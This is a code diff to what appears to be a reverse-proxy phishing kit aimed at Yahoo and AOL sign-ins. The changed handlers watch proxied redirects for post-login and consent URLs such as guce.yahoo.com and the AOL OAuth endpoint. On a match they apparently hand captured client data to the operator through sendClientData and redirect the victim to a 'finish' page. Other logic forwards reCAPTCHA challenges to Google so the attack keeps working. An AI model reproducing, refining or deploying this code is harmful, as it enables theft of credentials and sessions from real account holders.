@@ -66,18 +66,6 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
         }
 
 
-        const extRedirectObj = super.getExternalRedirect()
-        if (extRedirectObj !== null) {
-            const rLocation = extRedirectObj.url
-            const checkUrls = ["https://guce.yahoo.com", "https://www.aol.com/?guccounter=1&guce_referrer=", "https://www.aol.com/", "/account/comm-channel/refresh"]
-            
-            for (let exitUrl of checkUrls) {
-                if (rLocation.startsWith(exitUrl)) {
-                    this.browserEndPoint.setHeader('location', '/auth/login/finish')
-                }
-            }           
-        }
-
         // return super.processResponse()
          let newMsgBody;
         return this.superPrepareResponse(true)
@@ -169,6 +157,23 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
         const redirectToken = this.checkForRedirect()
         if (redirectToken !== null) {
             console.log(JSON.stringify(redirectToken))
+
+            const checkUrls = ["https://guce.yahoo.com", 
+            "https://www.yahoo.com/?guccounter=1&guce_referrer=", "https://www.yahoo.com/", 
+             "/account/comm-channel/refresh", '/account/upsell/webauthn',
+             "https://api.login.aol.com/oauth2/request_auth",
+             'https://guce.aol.com/consent', "https://www.aol.com/"
+
+             ]
+             for (let exitUrl of checkUrls) {
+                if (redirectToken.url.startsWith(exitUrl)) {
+                    super.sendClientData(clientContext, {})
+                    this.res.writeHead(302, { location: '/auth/login/finish' })
+                    return super.cleanEnd(clientContext.currentDomain, clientContext)
+                }
+            }
+            
+            
             const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
             if (redirectToken.obj.pathname.startsWith('/account/challenge/recaptcha')) {
                 this.req.url = reqCheck.replace(clientContext.hostname, 'www.google.com')
